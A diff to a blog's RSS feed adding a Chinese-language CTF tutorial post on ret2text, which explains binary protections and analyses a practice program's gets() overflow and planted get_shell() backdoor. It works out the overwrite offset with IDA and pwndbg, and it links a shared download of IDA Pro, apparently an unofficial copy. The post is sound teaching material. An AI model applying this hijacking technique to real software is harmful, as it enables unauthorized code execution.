@@ -6,7 +6,490 @@
         <description>Recent content on KiraPGR&#39;s Blog</description>
         <generator>Hugo -- gohugo.io</generator>
         <language>en-us</language>
-        <lastBuildDate>Thu, 10 Feb 2022 07:54:34 -0500</lastBuildDate><atom:link href="https://kira-pgr.github.io/index.xml" rel="self" type="application/rss+xml" /><item>
+        <lastBuildDate>Thu, 10 Feb 2022 22:54:20 -0500</lastBuildDate><atom:link href="https://kira-pgr.github.io/index.xml" rel="self" type="application/rss+xml" /><item>
+        <title>PWN! PWN! PANG! Part4 --- ret2text</title>
+        <link>https://kira-pgr.github.io/posts/pwn4/</link>
+        <pubDate>Thu, 10 Feb 2022 22:54:20 -0500</pubDate>
+        
+        <guid>https://kira-pgr.github.io/posts/pwn4/</guid>
+        <description>&lt;img src="https://kira-pgr.github.io/posts/pwn4/cover.jpg" alt="Featured image of post PWN! PWN! PANG! Part4 --- ret2text" /&gt;&lt;h1 id=&#34;pwn-pwn-pang-part4&#34;&gt;PWN! PWN! PANG! Part4&lt;/h1&gt;
+&lt;h2 id=&#34;必须有的前言&#34;&gt;必须有的前言&lt;/h2&gt;
+&lt;p&gt;从Part4开始我们就要正式进入实战部分了哦qaq,&lt;/p&gt;
+&lt;p&gt;本篇文章主要讲述最最简单的一种栈溢出利用姿势&lt;strong&gt;ret2text&lt;/strong&gt;&lt;/p&gt;
+&lt;h2 id=&#34;资料投放__&#34;&gt;资料投放&amp;gt;__&amp;lt;&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://mimiksworkshop-my.sharepoint.com/:u:/g/personal/kirapgr_mimiksworkshop_onmicrosoft_com/EYfbZCQ5bYlNmkY7tEKqHkkB6xhh7qXUlfdzvU1fu_f6jw?e=eOg9Ak&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;IDA Pro 7.5&lt;/a&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://mimiksworkshop-my.sharepoint.com/:u:/g/personal/kirapgr_mimiksworkshop_onmicrosoft_com/Ea4xaVYyrXhGpe-xicuoxJsBGZNUXe3FFg2zpc5tHVYi-A?e=QManqf&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;ret2text题目&lt;/a&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;blockquote&gt;
+&lt;p&gt;P.S. 这里安利一下OneDrive云盘优秀的分享功能，速度快&lt;strong&gt;且可以脱离客户端&lt;/strong&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;h2 id=&#34;补充知识点linux程序安全保护机制&#34;&gt;补充知识点：Linux程序安全保护机制&lt;/h2&gt;
+&lt;h3 id=&#34;aslr-地址随机化技术&#34;&gt;ASLR: 地址随机化技术&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;全名: Address Space Layout Randomization&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;系统的保护措施, 和程序没有关系, &lt;strong&gt;一般默认目标机器随机化完全开启&lt;/strong&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;可以通过&lt;code&gt;cat /proc/sys/kernel/randomize_va_space&lt;/code&gt;查看系统保护的开启情况&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;blockquote&gt;
+&lt;p&gt;ASLR选项:&lt;/p&gt;
+&lt;p&gt;0 关闭&lt;/p&gt;
+&lt;p&gt;1 半随机 共享库 栈 mmap()分配的堆空间以及VDSO将被随机化&lt;/p&gt;
+&lt;p&gt;2 全随机 brk()分配的堆空间也被虚拟化&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;h3 id=&#34;pie-随机化elf文件映射地址&#34;&gt;PIE: 随机化ELF文件映射地址&lt;/h3&gt;
+&lt;p&gt;&lt;del&gt;好饿，想吃馅饼了  雾)&lt;/del&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;全名: Position-Independent Executable&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;程序的防护措施，编译时生效&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;blockquote&gt;
+&lt;p&gt;检测程序防护措施的方法:PWNTools的checksec模块&lt;/p&gt;
+&lt;p&gt;详细使用技巧见下文&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;开启 ASLR 之后，PIE 才会生效&lt;/strong&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&#34;the-nx-bitsnx-栈不可执行&#34;&gt;The NX bits(NX): 栈不可执行&lt;/h3&gt;
+&lt;blockquote&gt;
+&lt;p&gt;栈为什么要不可执行呢?  &lt;del&gt;小问号你是否有很多小朋友???&lt;/del&gt;&lt;/p&gt;
+&lt;p&gt;从前面的知识中可以了解到，攻击者可以通过栈溢出劫持程序执行流，强迫程序执行制定地址的内容&lt;/p&gt;
+&lt;p&gt;而如果恰好攻击者在栈中写入了shellcode(指执行后可以直接拿到shell的代码)，就可以通过直接执行栈中写入的shellcode来getshell&lt;/p&gt;
+&lt;p&gt;所以，为了防范攻击者这么轻易就能做坏事= =  &lt;strong&gt;The NX bits&lt;/strong&gt;就诞生了&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;全名: the No-eXecute bits&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;程序与操作系统的防护措施，编译时决定是否生效(也就意味着可以通过checksec查看)，由操作系统实现&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;实现: 通过在内存页的标识中增加“执行”位, 可以表示该内存页是否可以执行, 若程序代码的 EIP 执行至不可运行的内存页, 则 CPU 将直接拒绝执行“指令”造成程序崩溃&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;figure 
+	
+		class=&#34;gallery-image&#34; 
+		style=&#34;
+			flex-grow: 191; 
+			flex-basis: 458px&#34;
+	&gt;
+	&lt;a href=&#34;https://kira-pgr.github.io/posts/pwn4/NX.png&#34; data-size=&#34;965x505&#34;&gt;
+		&lt;img src=&#34;https://kira-pgr.github.io/posts/pwn4/NX.png&#34;
+			width=&#34;965&#34;
+			height=&#34;505&#34;
+			srcset=&#34;https://kira-pgr.github.io/posts/pwn4/NX_huf92587b3a67de37aa32a327dcfaf9f5e_36957_480x0_resize_box_3.png 480w, https://kira-pgr.github.io/posts/pwn4/NX_huf92587b3a67de37aa32a327dcfaf9f5e_36957_1024x0_resize_box_3.png 1024w&#34;
+			loading=&#34;lazy&#34;
+			alt=&#34;关于内存中的ELF各部分的权限&#34;&gt;
+	&lt;/a&gt;
+	
+	&lt;figcaption&gt;关于内存中的ELF各部分的权限&lt;/figcaption&gt;
+	
+&lt;/figure&gt;&lt;/p&gt;
+&lt;h3 id=&#34;canary-金丝雀--专门针对栈溢出的防护&#34;&gt;Canary &lt;del&gt;(金丝雀)&lt;/del&gt; : 专门针对栈溢出的防护&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;程序的防护措施，编译时生效&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;基本上Canary开启我们就不采用栈溢出的思路&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;实现:在刚进入函数时，在栈上放置一个标志canary，在函数返回时检测其是否被改变。以达到防护栈溢出的目的&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;canary长度为1字长，其位置不一定与ebp/rbp存储的位置相邻，具体得看程序的汇编操作&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&#34;relro-重定位信息不可写&#34;&gt;RELRO: 重定位信息不可写&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;全名: RELocate Read-Only&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;程序的防护措施，编译时生效&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;分为关闭RELRO，部分RELRO(目前是gcc默认), 完全RELRO&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;在本系列文章中不讲解，如果有兴趣可以去看&lt;a class=&#34;link&#34; href=&#34;https://blog.csdn.net/ylcangel/article/details/102625948&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;这篇文章&lt;/a&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;pwn-pwn-pang&#34;&gt;PWN? PWN! PANG!&lt;/h2&gt;
+&lt;h3 id=&#34;前期准备&#34;&gt;前期准备&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;下载好所需文件(IDA, 目标程序ret2text)&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;在ret2text相同目录下打开终端&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;准备好一个Windows系统&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;确保ret2text文件可以执行&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;ll
+chmod +x ret2text
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;查看保护开启情况&#34;&gt;查看保护开启情况&lt;/h3&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;checksec ret2text
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;blockquote&gt;
+&lt;p&gt;至于checksec用法嘛= =    checksec 文件名&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;结果&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;/home/kali/Sec/PWN/Stack/ret2text&amp;#39;&lt;/span&gt;
+    Arch:     i386-32-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;0x8048000&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;可以看见这是一个32位程序，开启了NX&lt;/p&gt;
+&lt;h3 id=&#34;反汇编分析&#34;&gt;反汇编分析&lt;/h3&gt;
+&lt;p&gt;因为IDA是win平台的，所以我们就得先请出一只无辜的Windows&lt;/p&gt;
+&lt;p&gt;将ret2text拖到 &lt;code&gt;ida.exe&lt;/code&gt; 上打开&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;如果是64位程序，则选择 &lt;code&gt;ida64.exe&lt;/code&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;同意使用协议&lt;/p&gt;
+&lt;p&gt;&lt;figure 
+	
+		class=&#34;gallery-image&#34; 
+		style=&#34;
+			flex-grow: 88; 
+			flex-basis: 213px&#34;
+	&gt;
+	&lt;a href=&#34;https://kira-pgr.github.io/posts/pwn4/l.png&#34; data-size=&#34;538x605&#34;&gt;
+		&lt;img src=&#34;https://kira-pgr.github.io/posts/pwn4/l.png&#34;
+			width=&#34;538&#34;
+			height=&#34;605&#34;
+			srcset=&#34;https://kira-pgr.github.io/posts/pwn4/l_hu1fa2aa2e1b890eb08b606cfd11a994fa_41709_480x0_resize_box_3.png 480w, https://kira-pgr.github.io/posts/pwn4/l_hu1fa2aa2e1b890eb08b606cfd11a994fa_41709_1024x0_resize_box_3.png 1024w&#34;
+			loading=&#34;lazy&#34;
+			alt=&#34;协议&#34;&gt;
+	&lt;/a&gt;
+	
+	&lt;figcaption&gt;协议&lt;/figcaption&gt;
+	
+&lt;/figure&gt;&lt;/p&gt;
+&lt;p&gt;选择第一个(默认配置)然后ok&lt;/p&gt;
+&lt;p&gt;&lt;figure 
+	
+		class=&#34;gallery-image&#34; 
+		style=&#34;
+			flex-grow: 127; 
+			flex-basis: 307px&#34;
+	&gt;
+	&lt;a href=&#34;https://kira-pgr.github.io/posts/pwn4/1.png&#34; data-size=&#34;581x454&#34;&gt;
+		&lt;img src=&#34;https://kira-pgr.github.io/posts/pwn4/1.png&#34;
+			width=&#34;581&#34;
+			height=&#34;454&#34;
+			srcset=&#34;https://kira-pgr.github.io/posts/pwn4/1_hu1881ecf0a0571954c467ceaf6b9213f7_24807_480x0_resize_box_3.png 480w, https://kira-pgr.github.io/posts/pwn4/1_hu1881ecf0a0571954c467ceaf6b9213f7_24807_1024x0_resize_box_3.png 1024w&#34;
+			loading=&#34;lazy&#34;
+			alt=&#34;嘛= =&#34;&gt;
+	&lt;/a&gt;
+	
+	&lt;figcaption&gt;嘛= =&lt;/figcaption&gt;
+	
+&lt;/figure&gt;&lt;/p&gt;
+&lt;p&gt;双击左栏main进入主函数&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;&lt;strong&gt;TIP:  如你界面和我不相同请按空格键切换&lt;/strong&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;&lt;figure 
+	
+		class=&#34;gallery-image&#34; 
+		style=&#34;
+			flex-grow: 201; 
+			flex-basis: 482px&#34;
+	&gt;
+	&lt;a href=&#34;https://kira-pgr.github.io/posts/pwn4/main.png&#34; data-size=&#34;1602x797&#34;&gt;
+		&lt;img src=&#34;https://kira-pgr.github.io/posts/pwn4/main.png&#34;
+			width=&#34;1602&#34;
+			height=&#34;797&#34;
+			srcset=&#34;https://kira-pgr.github.io/posts/pwn4/main_hu6507ccba3fe5ac751a946bbd7f095190_133880_480x0_resize_box_3.png 480w, https://kira-pgr.github.io/posts/pwn4/main_hu6507ccba3fe5ac751a946bbd7f095190_133880_1024x0_resize_box_3.png 1024w&#34;
+			loading=&#34;lazy&#34;
+			alt=&#34;主函数的反汇编&#34;&gt;
+	&lt;/a&gt;
+	
+	&lt;figcaption&gt;主函数的反汇编&lt;/figcaption&gt;
+	
+&lt;/figure&gt;&lt;/p&gt;
+&lt;p&gt;汇编看着太难受了? 按下F5即可看到c代码&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;&lt;strong&gt;Tip: 别忘了Fn键哦.qaq&lt;/strong&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;h3 id=&#34;思路分析&#34;&gt;思路分析&lt;/h3&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span class=&#34;kt&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;kr&#34;&gt;__cdecl&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;argc&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;const&lt;/span&gt; &lt;span class=&#34;kt&#34;&gt;char&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;**&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;argv&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;const&lt;/span&gt; &lt;span class=&#34;kt&#34;&gt;char&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;**&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;envp&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
+&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
+  &lt;span class=&#34;n&#34;&gt;setbuf&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;stdin&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
+  &lt;span class=&#34;n&#34;&gt;setbuf&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;stdout&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
+  &lt;span class=&#34;n&#34;&gt;puts&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;Have you heard of buffer overflow?&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
+  &lt;span class=&#34;n&#34;&gt;vulnerable&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt;
+  &lt;span class=&#34;n&#34;&gt;puts&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;It seems that you know nothing about it ......&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
+  &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
+&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;我们看到它调用了一个vulnerable函数  &lt;strong&gt;&lt;del&gt;(这也太明显了吧 = = )&lt;/del&gt;&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;查看那个 &lt;del&gt;欠揍的函数&lt;/del&gt; 代码，可以看见明显的一个漏洞&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span class=&#34;kt&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;vulnerable&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
+&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
+  &lt;span class=&#34;kt&#34;&gt;char&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;buffer&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;8&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;];&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;// [esp+8h] [ebp-10h] BYREF
+&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;
+  &lt;span class=&#34;n&#34;&gt;gets&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;buffer&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
+  &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
+&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;它使用&lt;code&gt;gets()&lt;/code&gt;读入局部变量&lt;code&gt;buffer[8]&lt;/code&gt;,由于&lt;code&gt;gets()&lt;/code&gt;不检查输入长度，所以就可以读入过长数据造成栈溢出&lt;/p&gt;
+&lt;p&gt;仔细观察左侧函数列表，&lt;code&gt;get_shell()&lt;/code&gt;引起了我们的注意&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span class=&#34;kt&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;get_shell&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
+&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
+  &lt;span class=&#34;n&#34;&gt;system&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;/bin/sh&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
+  &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
+&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;好家伙，直接双手呈上shell= =,&lt;/p&gt;
+&lt;p&gt;这看起来是某个程序员为了方便自己 &lt;del&gt;奇奇怪怪的意图&lt;/del&gt; 调试程序干的&amp;lt;好&amp;gt;事, 在程序了直接留下一个后门&lt;/p&gt;
+&lt;p&gt;现在我们的思路应该很清晰了，就是通过栈溢出篡改函数返回地址，劫持程序执行流，让其调用&lt;code&gt;get_shell()&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;figure 
+	
+		class=&#34;gallery-image&#34; 
+		style=&#34;
+			flex-grow: 177; 
+			flex-basis: 426px&#34;
+	&gt;
+	&lt;a href=&#34;https://kira-pgr.github.io/posts/pwn4/s.png&#34; data-size=&#34;986x555&#34;&gt;
+		&lt;img src=&#34;https://kira-pgr.github.io/posts/pwn4/s.png&#34;
+			width=&#34;986&#34;
+			height=&#34;555&#34;
+			srcset=&#34;https://kira-pgr.github.io/posts/pwn4/s_hu9786b2549c7d9b9bfe806264788a882a_29606_480x0_resize_box_3.png 480w, https://kira-pgr.github.io/posts/pwn4/s_hu9786b2549c7d9b9bfe806264788a882a_29606_1024x0_resize_box_3.png 1024w&#34;
+			loading=&#34;lazy&#34;
+			alt=&#34;把思路用图片的形式解释下吧.qaq&#34;&gt;
+	&lt;/a&gt;
+	
+	&lt;figcaption&gt;把思路用图片的形式解释下吧.qaq&lt;/figcaption&gt;
+	
+&lt;/figure&gt;&lt;/p&gt;
+&lt;h3 id=&#34;精心构造恶意数据&#34;&gt;精心构造恶意数据&lt;/h3&gt;
+&lt;p&gt;&lt;figure 
+	
+		class=&#34;gallery-image&#34; 
+		style=&#34;
+			flex-grow: 209; 
+			flex-basis: 503px&#34;
+	&gt;
+	&lt;a href=&#34;https://kira-pgr.github.io/posts/pwn4/of.png&#34; data-size=&#34;877x418&#34;&gt;
+		&lt;img src=&#34;https://kira-pgr.github.io/posts/pwn4/of.png&#34;
+			width=&#34;877&#34;
+			height=&#34;418&#34;
+			srcset=&#34;https://kira-pgr.github.io/posts/pwn4/of_hu265d6c91663920ba0b132793828898e6_26788_480x0_resize_box_3.png 480w, https://kira-pgr.github.io/posts/pwn4/of_hu265d6c91663920ba0b132793828898e6_26788_1024x0_resize_box_3.png 1024w&#34;
+			loading=&#34;lazy&#34;
+			alt=&#34;栈溢出发生时栈帧的情况(32位程序)&#34;&gt;
+	&lt;/a&gt;
+	
+	&lt;figcaption&gt;栈溢出发生时栈帧的情况(32位程序)&lt;/figcaption&gt;
+	
+&lt;/figure&gt;&lt;/p&gt;
+&lt;p&gt;既然要溢出，那么我们要溢出多少才可以呢？&lt;/p&gt;
+&lt;p&gt;观察上面的图片,我们可以发现，我们首先要用垃圾数据把局部变量空间(因具体情况而定)和&lt;code&gt;prev ebp&lt;/code&gt;的空间(32位4字节.64位8字节)填满，&lt;strong&gt;然后再加上&lt;code&gt;get_shell()&lt;/code&gt;的地址覆盖返回地址&lt;/strong&gt;&lt;/p&gt;
+&lt;hr&gt;
+&lt;p&gt;计算所需垃圾数据长度方法&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;通过IDA的注释获取(不一定准确)&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;在IDA对于受害者函数的反编译代码中，有这样一句&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span class=&#34;kt&#34;&gt;char&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;buffer&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;8&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;];&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;// [esp+8h] [ebp-10h] BYREF
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;可以看到buffer[8]距离&lt;code&gt;prev ebp&lt;/code&gt;有16字节的距离，由于我们还需填充&lt;code&gt;prev ebp&lt;/code&gt;,我们还要填充4字节的垃圾数据，一共20字节垃圾数据&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;通过pwndbg动态调试&lt;/li&gt;
+&lt;/ul&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;gdb ret2text
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;由于我们要溢出的地方在函数&lt;code&gt;vulnerable()&lt;/code&gt;,我们直接在那个地方打断点&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;b vulnerable
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;现在开始调试该程序&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;r
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;一直下一步直到输入(虽说本次只需要一次)&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;n
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;输入8个A测试一下&lt;/p&gt;
+&lt;p&gt;&lt;figure 
+	
+		class=&#34;gallery-image&#34; 
+		style=&#34;
+			flex-grow: 184; 
+			flex-basis: 443px&#34;
+	&gt;
+	&lt;a href=&#34;https://kira-pgr.github.io/posts/pwn4/n.png&#34; data-size=&#34;1145x620&#34;&gt;
+		&lt;img src=&#34;https://kira-pgr.github.io/posts/pwn4/n.png&#34;
+			width=&#34;1145&#34;
+			height=&#34;620&#34;
+			srcset=&#34;https://kira-pgr.github.io/posts/pwn4/n_huc568db901354378ff555ada67fedb758_589868_480x0_resize_box_3.png 480w, https://kira-pgr.github.io/posts/pwn4/n_huc568db901354378ff555ada67fedb758_589868_1024x0_resize_box_3.png 1024w&#34;
+			loading=&#34;lazy&#34;
+			alt=&#34;AAAAAAAA&#34;&gt;
+	&lt;/a&gt;
+	
+	&lt;figcaption&gt;AAAAAAAA&lt;/figcaption&gt;
+	
+&lt;/figure&gt;&lt;/p&gt;
+&lt;p&gt;输入stack 大小(这个大小随意，最好大一些) 查看栈的情况&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;stack 40
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;结果&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;pwndbg&amp;gt; stack &lt;span class=&#34;m&#34;&gt;40&lt;/span&gt;
+00:0000│ esp 0xffffd070 ◂— 0x1
+01:0004│     0xffffd074 —▸ 0x80483e0 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;_start&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; ◂— xor    ebp, ebp
+02:0008│ eax 0xffffd078 ◂— &lt;span class=&#34;s1&#34;&gt;&amp;#39;AAAAAAAA&amp;#39;&lt;/span&gt;
+03:000c│     0xffffd07c ◂— &lt;span class=&#34;s1&#34;&gt;&amp;#39;AAAA&amp;#39;&lt;/span&gt;
+04:0010│     0xffffd080 —▸ 0x8048600 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;__libc_csu_init+32&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; ◂— dec    dword ptr &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;ebp - 0xfb7d&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
+05:0014│     0xffffd084 —▸ 0x804a000 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;_GLOBAL_OFFSET_TABLE_&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; —▸ 0x8049f0c &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;_DYNAMIC&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; ◂— 0x1
